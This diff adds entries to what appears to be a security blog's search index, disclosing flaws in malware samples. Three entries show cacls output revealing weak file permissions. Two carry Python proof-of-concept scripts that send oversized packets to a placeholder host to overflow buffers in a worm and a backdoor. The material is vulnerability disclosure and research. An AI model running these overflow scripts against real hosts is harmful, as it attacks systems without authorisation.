@@ -4,6 +4,131 @@
   
     
     <entry>
+      <title>Newfuture Trojan V.1.0 BETA 1 Insecure Permissions</title>
+      <link href="2021/01/20/Newfuture-Trojan-V-1-0-BETA-1-Insecure-Permissions/"/>
+      <url>2021/01/20/Newfuture-Trojan-V-1-0-BETA-1-Insecure-Permissions/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Newfuture-Trojan-V-1-0-BETA-1-Insecure-Permissions"><a href="#Newfuture-Trojan-V-1-0-BETA-1-Insecure-Permissions" class="headerlink" title="Newfuture Trojan V.1.0 BETA 1 Insecure Permissions"></a>Newfuture Trojan V.1.0 BETA 1 Insecure Permissions</h4><p>Newfuture Trojan V.1.0 BETA 1 malware suffers from an insecure permissions vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">C:\&gt;cacls &quot;C:\Archivos de Programa\Newfuture Trojan BETA 1&quot;<br>C:\Archivos de Programa\Newfuture Trojan BETA 1 BUILTIN\Administrators:(OI)(CI)(ID)F<br>                                                NT AUTHORITY\SYSTEM:(OI)(CI)(ID)F<br>                                                BUILTIN\Users:(OI)(CI)(ID)R<br>                                                NT AUTHORITY\Authenticated Users:(ID)C<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Insecure Permissions </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Constructor.Win32.SMWG.a Insecure Permissions</title>
+      <link href="2021/01/20/Constructor-Win32-SMWG-a-Insecure-Permissions/"/>
+      <url>2021/01/20/Constructor-Win32-SMWG-a-Insecure-Permissions/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Constructor-Win32-SMWG-a-Insecure-Permissions"><a href="#Constructor-Win32-SMWG-a-Insecure-Permissions" class="headerlink" title="Constructor.Win32.SMWG.a Insecure Permissions"></a>Constructor.Win32.SMWG.a Insecure Permissions</h4><p>Constructor.Win32.SMWG.a suffers from an insecure permissions vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">C:\&gt;cacls c:\sucke.vbs<br>c:\sucke.vbs BUILTIN\Administrators:(ID)F<br>             NT AUTHORITY\SYSTEM:(ID)F<br>             BUILTIN\Users:(ID)R<br>             NT AUTHORITY\Authenticated Users:(ID)C<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Insecure Permissions </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Constructor.Win32.SMWG.c Insecure Permissions</title>
+      <link href="2021/01/20/Constructor-Win32-SMWG-c-Insecure-Permissions/"/>
+      <url>2021/01/20/Constructor-Win32-SMWG-c-Insecure-Permissions/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Constructor-Win32-SMWG-c-Insecure-Permissions"><a href="#Constructor-Win32-SMWG-c-Insecure-Permissions" class="headerlink" title="Constructor.Win32.SMWG.c Insecure Permissions"></a>Constructor.Win32.SMWG.c Insecure Permissions</h4><p>Constructor.Win32.SMWG.c malware suffers from an insecure permissions vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">C:\&gt;cacls c:\sucke.vbs<br>c:\sucke.vbs BUILTIN\Administrators:(ID)F<br>             NT AUTHORITY\SYSTEM:(ID)F<br>             BUILTIN\Users:(ID)R<br>             NT AUTHORITY\Authenticated Users:(ID)C<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Insecure Permissions </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Email-Worm.Win32.Agent.gi Remote Stack Buffer Overflow</title>
+      <link href="2021/01/20/Email-Worm-Win32-Agent-gi-Remote-Stack-Buffer-Overflow/"/>
+      <url>2021/01/20/Email-Worm-Win32-Agent-gi-Remote-Stack-Buffer-Overflow/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Email-Worm-Win32-Agent-gi-Remote-Stack-Buffer-Overflow"><a href="#Email-Worm-Win32-Agent-gi-Remote-Stack-Buffer-Overflow" class="headerlink" title="Email-Worm.Win32.Agent.gi Remote Stack Buffer Overflow"></a>Email-Worm.Win32.Agent.gi Remote Stack Buffer Overflow</h4><p>Email-Worm.Win32.Agent.gi malware suffers from a remote stack buffer overflow vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span><br>PORT=<span class="hljs-number">53</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doit</span>():</span><br>    s=socket(AF_INET, SOCK_DGRAM)<br>    s.connect((MALWARE_HOST, PORT))<br><br>    <span class="hljs-comment">#R for EIP</span><br>    PACKOLA=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">324</span>+<span class="hljs-string">&quot;R&quot;</span>*<span class="hljs-number">8</span><br><br>    s.send(PACKOLA)<br>    s.close()<br>    <br>    print(<span class="hljs-string">&quot;Email-Worm.Win32.Agent.gi / Remote UDP Buffer Overflow (SYSTEM)&quot;</span>)<br>    print(<span class="hljs-string">&quot;MD5: 74e65773735f977185f6a09f1472ea46&quot;</span>);<br>    print(<span class="hljs-string">&quot;By Malvuln&quot;</span>);<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    doit()<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Remote Stack Buffer Overflow </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Backdoor.Win32.NetBull.11.a Remote Buffer Overflow</title>
+      <link href="2021/01/20/Backdoor-Win32-NetBull-11-a-Remote-Buffer-Overflow/"/>
+      <url>2021/01/20/Backdoor-Win32-NetBull-11-a-Remote-Buffer-Overflow/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Backdoor-Win32-NetBull-11-a-Remote-Buffer-Overflow"><a href="#Backdoor-Win32-NetBull-11-a-Remote-Buffer-Overflow" class="headerlink" title="Backdoor.Win32.NetBull.11.a Remote Buffer Overflow"></a>Backdoor.Win32.NetBull.11.a Remote Buffer Overflow</h4><p>Backdoor.Win32.NetBull.11.a malware suffers from a remote buffer overflow vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span><br>PORT=<span class="hljs-number">23444</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doit</span>():</span><br>    s=socket(AF_INET, SOCK_STREAM)<br>    s.connect((MALWARE_HOST, PORT))<br><br>    PACKET=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">666</span><br><br>    s.send(PACKET)<br>    s.close()<br>    print(<span class="hljs-string">&quot;Backdoor.Win32.NetBull.11.a / Remote Buffer Overflow&quot;</span>);<br>    print(<span class="hljs-string">&quot;MD5: 80e98fdf726a3e727f3414bdbf2e86bb&quot;</span>);<br>    print(<span class="hljs-string">&quot;By Malvuln&quot;</span>);<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    doit()<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Remote Stack Buffer Overflow </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Inteno IOPSYS 3.16.4 Root Filesystem Access</title>
       <link href="2021/01/19/Inteno-IOPSYS-3-16-4-Root-Filesystem-Access/"/>
       <url>2021/01/19/Inteno-IOPSYS-3-16-4-Root-Filesystem-Access/</url>
